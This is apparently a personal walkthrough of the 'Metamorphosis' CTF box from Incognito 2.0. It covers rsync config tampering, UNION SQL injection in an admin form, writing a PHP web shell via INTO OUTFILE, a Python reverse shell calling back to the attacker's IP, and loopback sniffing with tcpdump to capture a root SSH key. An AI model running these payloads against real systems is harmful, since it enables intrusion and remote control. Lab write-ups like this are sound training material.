----
Part of Incognito CTF
----

![](https://0cirius0.github.io/writeup/assets/img/metamorphosis/main.jpg)

### Task 1  Challenge

 Start Machine

Part of [Incognito 2.0 CTF](https://ctftime.org/event/1321)

Like my work, Follow on twitter to be updated and know more about my work! ([@0cirius0](https://twitter.com/0cirius0))

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.84.192 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.84.192:22
Open 10.10.84.192:80
Open 10.10.84.192:139
Open 10.10.84.192:445
Open 10.10.84.192:873
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 12:14 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:14, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:14
Completed Parallel DNS resolution of 1 host. at 12:14, 0.04s elapsed
DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:14
Scanning 10.10.84.192 [5 ports]
Discovered open port 445/tcp on 10.10.84.192
Discovered open port 80/tcp on 10.10.84.192
Discovered open port 139/tcp on 10.10.84.192
Discovered open port 22/tcp on 10.10.84.192
Discovered open port 873/tcp on 10.10.84.192
Completed Connect Scan at 12:14, 0.22s elapsed (5 total ports)
Initiating Service scan at 12:14
Scanning 5 services on 10.10.84.192
Completed Service scan at 12:14, 11.77s elapsed (5 services on 1 host)
NSE: Script scanning 10.10.84.192.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:14
Completed NSE at 12:15, 12.65s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 1.18s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Nmap scan report for 10.10.84.192
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-23 12:14:39 EDT for 26s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f70f0a1850780710f232d1603040d4be (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjT/lRIkM7TFdpO6bwrOH8B0fB1kVslwfc/jdO+WtRiic1J8hDXzLatrXeBpzFqWveVmMI84dUhmidyBTk+jIksonSxB6IrLxCw+clRTQOUGXYw6iu3DiVZ6Xr/BlnxscgGuFMEvYd7E2ADyyVY/HDvpPMIv7SrDxfd+UNXf9yELZbsgY9CEqBuqT/3Ka4lt6ecslpcfMbkhZdiTgYnZ9EMrcmJlKcEXMq/tliZt5VuV7nxOEqKi1LfmgeIcl48Mok1sPCro+QsVfR5BvJPilLIfC35HoaBF1tyIdbzvZLfj/iCB/EhhtMqLZoPB2l/fg7RQ9soXK1rYgRbM0x7sv7
|   256 5c0037dfb2ba4cf23c466ea3e9449037 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGW8YbCvrlt/1rWQ4pObroj9o9vLbiGbYb/xxAjX/HoTxGUGYF/lYBCbZtmv8Fnkfs5Lg6K5MIHjjd/jpzNDQOg=
|   256 febf53f1d05a7c30dbacc83c796447c8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKxJeDTFMHsXaGHyZ8lSFpxm8VpawK1rvSDY0lbifD8e
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp open  rsync       syn-ack (protocol version 31)
Service Info: Host: INCOGNITO; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2023-07-23T16:14:56+00:00
|_clock-skew: mean: 2s, deviation: 2s, median: 1s
| smb2-time: 
|   date: 2023-07-23T16:14:55
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45920/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 34665/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 64711/udp): CLEAN (Failed to receive data)
|   Check 4 (port 7721/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   INCOGNITO<00>        Flags: <unique><active>
|   INCOGNITO<03>        Flags: <unique><active>
|   INCOGNITO<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:15
Completed NSE at 12:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ smbclient -L 10.10.84.192 
Password for [WORKGROUP\witty]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (incognito server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            INCOGNITO

┌──(witty㉿kali)-[~/Downloads]
└─$ smbmap -u anonymous -H 10.10.84.192
[+] Guest session   	IP: 10.10.84.192:445	Name: 10.10.84.192                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (incognito server (Samba, Ubuntu))

┌──(root㉿kali)-[/home/witty/Downloads]
└─# dirsearch -u http://10.10.84.192 -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.84.192/_23-07-23_12-19-14.txt

Error Log: /root/.dirsearch/logs/errors-23-07-23_12-19-14.log

Target: http://10.10.84.192/

[12:19:14] Starting: 
[12:20:07] 301 -  312B  - /admin  ->  http://10.10.84.192/admin/
[12:20:09] 200 -  132B  - /admin/
[12:20:09] 200 -  132B  - /admin/?/login
[12:20:10] 200 -    0B  - /admin/config.php
[12:20:11] 200 -  132B  - /admin/index.php
[12:21:09] 200 -   11KB - /index.php
[12:21:10] 200 -   11KB - /index.php/login/

Task Completed

like vulnnet internal

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync --list-only rsync://10.10.84.192 
Conf           	All Confs

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync --list-only rsync://10.10.84.192/Conf
drwxrwxrwx          4,096 2021/04/10 16:03:08 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 16:03:06 webapp.ini

or

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync -av rsync://10.10.84.192/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 16:03:08 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 16:03:06 webapp.ini

sent 20 bytes  received 379 bytes  114.00 bytes/sec
total size is 193,430  speedup is 484.79


The `rsync` command is a powerful file synchronization and transfer tool used in Unix-based systems. It is used to efficiently copy and synchronize files between different locations, whether they are local directories or remote systems accessible via SSH or rsync protocol.

- `-a`: This option stands for "archive mode" and is used to preserve the file's metadata during the synchronization process, including permissions, timestamps, and symbolic links.
- `-v`: The "verbose" option, which displays detailed output during the synchronization process, showing which files are being transferred.

In summary, the main difference is that `rsync` without the `--list-only` option performs the actual synchronization, while `rsync --list-only` shows the preview of the changes without actually transferring any files.

┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync -av --list-only rsync://10.10.84.192/Conf 
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 16:03:08 .
-rw-r--r--          4,620 2021/04/09 16:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 15:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 16:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 16:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 16:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 15:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 15:56:56 php.ini
-rw-r--r--            320 2021/04/09 16:03:16 ports.conf
-rw-r--r--            589 2021/04/09 16:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 16:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 16:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 16:03:06 webapp.ini

sent 20 bytes  received 379 bytes  266.00 bytes/sec
total size is 193,430  speedup is 484.79

now copy files

                                                                                              
┌──(root㉿kali)-[/home/witty/Downloads]
└─# rsync -aPv rsync://10.10.84.192/Conf ./myConf
receiving incremental file list
created directory ./myConf
./
access.conf
          4,620 100%    4.41MB/s    0:00:00 (xfr#1, to-chk=11/13)
bluezone.ini
          1,341 100%  654.79kB/s    0:00:00 (xfr#2, to-chk=10/13)
debconf.conf
          2,969 100%  966.47kB/s    0:00:00 (xfr#3, to-chk=9/13)
ldap.conf
            332 100%  108.07kB/s    0:00:00 (xfr#4, to-chk=8/13)
lvm.conf
         94,404 100%   77.54kB/s    0:00:01 (xfr#5, to-chk=7/13)
mysql.ini
          9,005 100%   94.56kB/s    0:00:00 (xfr#6, to-chk=6/13)
php.ini
         70,207 100%   88.13kB/s    0:00:00 (xfr#7, to-chk=5/13)
ports.conf
            320 100%    0.40kB/s    0:00:00 (xfr#8, to-chk=4/13)
resolv.conf
            589 100%    0.74kB/s    0:00:00 (xfr#9, to-chk=3/13)
screen-cleanup.conf
             29 100%    0.04kB/s    0:00:00 (xfr#10, to-chk=2/13)
smb.conf
          9,542 100%   10.87kB/s    0:00:00 (xfr#11, to-chk=1/13)
webapp.ini
             72 100%    0.08kB/s    0:00:00 (xfr#12, to-chk=0/13)

sent 255 bytes  received 194,360 bytes  43,247.78 bytes/sec
total size is 193,430  speedup is 0.99

┌──(root㉿kali)-[/home/witty/Downloads]
└─# cd ./myConf 
                                                                                              
┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# ls
access.conf   debconf.conf  lvm.conf   php.ini     resolv.conf          smb.conf
bluezone.ini  ldap.conf     mysql.ini  ports.conf  screen-cleanup.conf  webapp.ini

┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# cat webapp.ini 
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No

view-source:http://10.10.84.192/admin/

<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>

so changing to dev instead of prod (also we have creds)


here we have the ‘**webapp.ini**’ file which is used by the server in which we can specify the environment to ‘dev’ and sync the webapp.ini file with the server

`webapp.ini` is a configuration file typically used in web applications. It contains settings and parameters that define how the web application behaves, interacts with databases, handles user sessions, and other important configurations.

The contents of `webapp.ini` can vary depending on the specific web application framework being used. Common settings found in a `webapp.ini` file might include:

1. Database connection information: Such as the database type (MySQL, PostgreSQL, SQLite, etc.), database name, username, password, and host.
    
2. Security settings: Including options related to authentication, authorization, and session management.
    
3. Debugging and logging configurations: To control the level of debugging information displayed and logged for troubleshooting purposes.
    
4. File paths and directories: To specify where static files (CSS, JavaScript) and templates are stored.
    
5. Server-specific configurations: Such as the server port, server host, and SSL settings.
    
6. Caching and performance settings: For optimizing the web application's performance.
    
7. Custom application-specific settings: These can vary widely depending on the specific requirements of the web application.
    

Each web application framework may have its own naming convention for the configuration file, but `webapp.ini` is a common name used in some frameworks like Flask and Pyramid.

It's important to keep `webapp.ini` secure, as it can contain sensitive information like database credentials or API keys that should not be exposed to the public. Properly configuring and protecting this file is essential for the security and proper functioning of the web application.

┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No

After Changing the value you need to upload the new file to the shared folder (Conf)

┌──(root㉿kali)-[/home/witty/Downloads/myConf]
└─# rsync -aPv webapp.ini rsync://10.10.84.192/Conf/webapp.ini
sending incremental file list
webapp.ini
             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)

sent 185 bytes  received 41 bytes  150.67 bytes/sec
total size is 71  speedup is 0.31

now check admin portal

after entering tom we get
Username Password
tom thecat

sqli using burp

username=tom" union select version(),2,3-- -

Username Password<br>tom thecat<br />Username Password<br>2 3<br />

username=tom" union select 1,version(),database()-- -

Username Password<br>tom thecat<br />Username Password<br>5.7.34-0ubuntu0.18.04.1 db<br />

cols 2,3 writable

┌──(witty㉿kali)-[~/Downloads]
└─$ python                                                       
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print (("<? system($_GET['cmd’]); ?>").encode('utf-8').hex())
3c3f2073797374656d28245f4745545b27636d64e280995d293b203f3e

username=witty" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -

HTTP/1.0 500 Internal Server Error

Date: Sun, 23 Jul 2023 16:59:56 GMT

Server: Apache/2.4.29 (Ubuntu)

Content-Length: 0

Connection: close

Content-Type: text/html; charset=UTF-8


but ...

http://10.10.84.192/revshell.php?cmd=id

\N uid=33(www-data) gid=33(www-data) groups=33(www-data) \N 

http://10.10.84.192/revshell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.19.103%22,1337));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.84.192] 59744
www-data@incognito:/var/www/html$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@incognito:/var/www/html$ ls
ls
admin  inde.html  index.php  revshell.php
www-data@incognito:/var/www/html$ cat revshell.php
cat revshell.php
\N	<?php system($_GET['cmd']);?>	\N

www-data@incognito:/var/www/html$ cat index.php
cat index.php
<?php

$doc = new DOMDocument();
$doc -> loadHTMLFile("./inde.html");
echo $doc->saveHTML();
echo "1";
?>

www-data@incognito:/var/www/html/admin$ cat config.php
cat config.php
<?php
$ini = parse_ini_file('/var/confs/webapp.ini');
if($ini['env']=='dev'){
$query=$_POST["username"];
$mysqli = new mysqli("localhost","dev","password","db");
if ($mysqli -> connect_errno) {
  echo "Failed to connect to MySQL: " . $mysqli -> connect_error;
  exit();
}
if ($result = $mysqli -> query('SELECT * FROM users where uname="'.$query.'"')) {
  while( $row = $result->fetch_array() )
{
    echo "Username Password<br>";
    echo $row['uname'] . " " . $row['password'];
    echo "<br />";
}
  // Free result set
  $result -> free_result();
}
}
else{
echo "";
}
?>

www-data@incognito:/var/www/html/admin$ cat index.php
cat index.php
<?php

$ini = parse_ini_file('/var/confs/webapp.ini');

if($ini['env']=='dev'){

echo "<html><head><div style='text-align:center'><h1 style='text-align:center'>Get Info of users</h1><form action='config.php' method='POST'>Username: <input type='text' name='username'/><input type='submit'/></form><br><h4>TODO: Add more features</div> <head></html>";
}
else{
echo "<html> <head><h1>403 Forbidden</h1></head><!-- Make sure admin functionality can only be used in development environment. --></html>";
}

?>

www-data@incognito:/var/www/html/admin$ cd /home
cd /home
www-data@incognito:/home$ ls
ls
tom
www-data@incognito:/home$ cd tom
cd tom
www-data@incognito:/home/tom$ ls
ls
user.txt
www-data@incognito:/home/tom$ cat user.txt
cat user.txt
4ce794a9d0019c1f684e07556821e0b0

www-data@incognito:/home/tom$ getcap / -r 2>/dev/null
getcap / -r 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep

like aratus

www-data@incognito:/home/tom$ tcpdump -i lo -A
tcpdump -i lo -A
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
17:08:02.090650 IP localhost.44096 > localhost.1027: Flags [S], seq 3848113646, win 65495, options [mss 65495,sackOK,TS val 3056414518 ecr 0,nop,wscale 6], length 0
E..<..@.@.z..........@...]...........0.........
.-/6........
17:08:02.090664 IP localhost.1027 > localhost.44096: Flags [S.], seq 605020400, ack 3848113647, win 65483, options [mss 65495,sackOK,TS val 3056414518 ecr 3056414518,nop,wscale 6], length 0
E..<..@.@.<............@$....].......0.........
.-/6.-/6....
17:08:02.090675 IP localhost.44096 > localhost.1027: Flags [.], ack 1, win 1024, options [nop,nop,TS val 3056414518 ecr 3056414518], length 0
E..4..@.@.z!.........@...]..$........(.....
.-/6.-/6
17:08:02.091330 IP localhost.44096 > localhost.1027: Flags [P.], seq 1:116, ack 1, win 1024, options [nop,nop,TS val 3056414519 ecr 3056414518], length 115
E.....@.@.y..........@...]..$..............
.-/7.-/6GET /?admin=ScadfwerDSAd_343123ds123dqwe12 HTTP/1.1
Host: 127.0.0.1:1027
User-Agent: curl/7.58.0
Accept: */*


17:08:02.113540 IP localhost.1027 > localhost.44096: Flags [P.], seq 1:18, ack 116, win 1024, options [nop,nop,TS val 3056414541 ecr 3056414519], length 17
E..E.R@.@..^...........@$....].b.....9.....
.-/M.-/7HTTP/1.0 200 OK

17:08:02.113552 IP localhost.44096 > localhost.1027: Flags [.], ack 18, win 1024, options [nop,nop,TS val 3056414541 ecr 3056414541], length 0
E..4..@.@.z..........@...].b$........(.....
.-/M.-/M
17:08:02.114120 IP localhost.1027 > localhost.44096: Flags [P.], seq 18:156, ack 116, win 1024, options [nop,nop,TS val 3056414542 ecr 3056414541], length 138
E....S@.@..............@$....].b...........
.-/N.-/MContent-Type: text/html; charset=utf-8
Content-Length: 1678
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Sun, 23 Jul 2023 17:08:02 GMT


17:08:02.114127 IP localhost.44096 > localhost.1027: Flags [.], ack 156, win 1022, options [nop,nop,TS val 3056414542 ecr 3056414542], length 0
E..4..@.@.z..........@...].b$........(.....
.-/N.-/N
17:08:02.114144 IP localhost.1027 > localhost.44096: Flags [P.], seq 156:1834, ack 116, win 1024, options [nop,nop,TS val 3056414542 ecr 3056414542], length 1678
E....T@.@..............@$....].b...........
.-/N.-/N-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
GPsboZECgYAVK5KksKV2lJqjX7x1xPAuHoJEyYKiZJuw/uzAbwG2b4YxKTcTXhM6
ClH5GV7D5xijpfznQ/eZcTpr2f6mfZQ3roO+sah9v4H3LpzT8UydBU2FqILxck4v
QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
-----END RSA PRIVATE KEY-----

┌──(witty㉿kali)-[~/Downloads]
└─$ nano metamorfosis_rsa       
                                                                                     
┌──(witty㉿kali)-[~/Downloads]
└─$ chmod 600 metamorfosis_rsa 


┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -i metamorfosis_rsa root@10.10.84.192
The authenticity of host '10.10.84.192 (10.10.84.192)' can't be established.
ED25519 key fingerprint is SHA256:8QhkjOmau5tEvySYZcNlR9w+DtEtBuYhh4kmgoSMPXI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.84.192' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-144-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 23 17:13:22 UTC 2023

  System load:  0.0               Processes:           114
  Usage of /:   53.3% of 8.79GB   Users logged in:     0
  Memory usage: 87%               IP address for eth0: 10.10.84.192
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Sat Apr 10 19:40:46 2021
root@incognito:~# ls
req.sh  root.txt  serv.py
root@incognito:~# cat root.txt
7ffca2ec63534d165525bf37d91b4ff4
root@incognito:~# cat serv.py
from flask import Flask,request

app = Flask(__name__)

@app.route('/')
def root():
    admin = request.args.get('admin')
    if(admin=="ScadfwerDSAd_343123ds123dqwe12"):
        return """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyLHluXzbi43DIBFC47uRqkXTe72yPGxL+ImFwvOw8D/vd9mj
rt5SXjXSVtn6TguV2SFovrTlreUsv1CQwCSCixdMyQIWCgS/d+LfUyO3SC4FEr+k
wJ0ALG6wdjmHdRDW91JW0pG9Q+nTyv22K0a/yT91ZdlL/5cVjGKtYIob/504AdZZ
5NyCGq8t7ZUKhx0+TuKKcr2dDfL6rC5GBAnDkMxqo6tjkUH9nlFK7E9is0u1F3Zx
qrgn6PwOLDHeLgrQUok8NUwxDYxRM5zXT+I1Lr7/fGy/50ASvyDxZyjDuHbB7s14
K2HI32lVrx8u4X9Y2zgIU/mlIjuUtTyIAH4kswIDAQABAoIBAQCcPUImIPmZrwcU
09tLBx7je/CkCI3VVEngds9XcfdxUZTPrPMsk490IFpbmt6uG37Qxp2QuauEsUEg
v0uxCbtHJSB169XUftXAMzLAurFY09rHOcK84HzeGl3t6+N0U2PGrqdAzoyVblef
U9yZ3D46Idj3LS9pDumLnNZ0rZAWcaHW+rgjNqjsoBdQL7HGW+sacDAmZzU/Eti9
mH97NnrxkZuGXcnabXWcUj0HFHssCpF8KFPT3xxwtrqkUTJdMvUxxCD54HXiKM3u
jLXlX+HwHfLKHugYvLUuez7XFi6UP83Hiqmq48kB09sBa2iTV/iy6mHe7iyeELaa
9o7WHF2hAoGBAOPxNWc3vH18qu3WC6eMphPdYOaGBjbNBOgzJxzh/evxpSwRSG9V
63gNgKJ8zccQff/HH1n54VS+tuF7RCykRNb+Ne7K/uiDe1TpOKEMi7XtXOYHy5s1
tykL0OPdSs4hN1jMJjkSfPgdNPmxM3bbJMHDPjdQXAK6DnXmOCETaPAnAoGBAOFm
Fhqv8OREYFq+h1mDzMJn5WsNQQZnvvetJR7g3gfKcVblwMhlh504Tf3o00OGCKC1
L4iWMNb6uitKfTmGNta5X8ChWSVxXbb9fOWCOudNGt/fb70SK6fK9CSl66i/niIw
cIcu0tpS/T3MoqwMiGk87ivtW3bK20TsnY0tX3KVAoGAEeJdBEo1OctMRfjjVTQN
28Uk0zF0z1vqpKVOzk9U8uw0v25jtoiRPwwgKZ+NLa83k5f198NJULLd+ncHdFE3
LX8okCHROkEGrjTWQpyPYajL/yhhaz4drtTEgPxd4CpvA0KRRS0ULQttmqGyngK3
sZQ2D3T4oyYh+FIl2UKCm0UCgYEAyiHWqNAnY02+ayJ6FtiPg7fQkZQtQCVBqLNp
mqtl8e6mfZtEq3IBkAiySIXHD8Lfcd+KZR7rZZ8r3S7L5g5ql11edU08uMtVk4j3
vIpxcIRBGYsylYf6BluHXmY9U/OjSF3QTCq9hHTwDb+6EjibDGVL4bDWWU3KHaFk
